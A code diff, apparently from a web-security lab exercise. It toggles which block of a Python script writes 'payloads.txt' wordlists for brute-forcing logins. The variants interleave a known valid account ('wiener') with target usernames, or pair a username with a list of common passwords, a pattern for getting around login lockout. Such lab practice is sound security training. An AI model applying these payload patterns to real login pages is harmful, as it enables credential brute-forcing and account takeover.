@@ -1,8 +1,8 @@
-# with open("payloads.txt", "w") as f:
-#     for _ in range(180):
-#         f.write("wiener\n")
-#         f.write("carlos\n")
-#         f.write("carlos\n")
+with open("payloads.txt", "w") as f:
+    for _ in range(180):
+        f.write("wiener\n")
+        f.write("carlos\n")
+        f.write("carlos\n")
 
 
 passwords = [
@@ -108,10 +108,14 @@ passwords = [
     "moscow"
 ]
 
-with open("payloads.txt", "w") as f:
-    for i in range(0, len(passwords), 2):
-        f.write("peter\n")
-        f.write(passwords[i] + "\n")
+# with open("payloads.txt", "w") as f:
+#     for i in range(0, len(passwords), 2):
+#         f.write("peter\n")
+#         f.write(passwords[i] + "\n")
 
-        if i + 1 < len(passwords):
-            f.write(passwords[i + 1] + "\n")
+#         if i + 1 < len(passwords):
+#             f.write(passwords[i + 1] + "\n")
+
+
+# with open("result.txt", "w") as f:
+#   f.write(("carlos\ncarlos\nwiener\n" * 100).strip())
